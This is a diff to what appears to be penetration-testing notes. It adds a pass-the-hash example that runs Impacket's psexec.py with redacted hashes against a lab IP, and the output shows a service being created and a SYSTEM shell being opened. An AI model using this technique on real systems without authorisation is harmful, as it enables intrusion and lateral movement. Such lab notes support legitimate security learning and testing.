@@ -85,6 +85,23 @@ Microsoft Windows [Version 10.0.14393]
 
 C:\Windows\system32> 
 ```
+Pass the hash:
+```
+$ /usr/local/bin/psexec.py administrator@10.129.240.61 -hashes redacted:redacted
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.240.61.....
+[*] Found writable share ADMIN$
+[*] Uploading file BSlkyprb.exe
+[*] Opening SVCManager on 10.129.240.61.....
+[*] Creating service hRgS on 10.129.240.61.....
+[*] Starting service hRgS.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+```
 
 ### msf psexec
 Metasploit psexec (windows/smb/psexec)
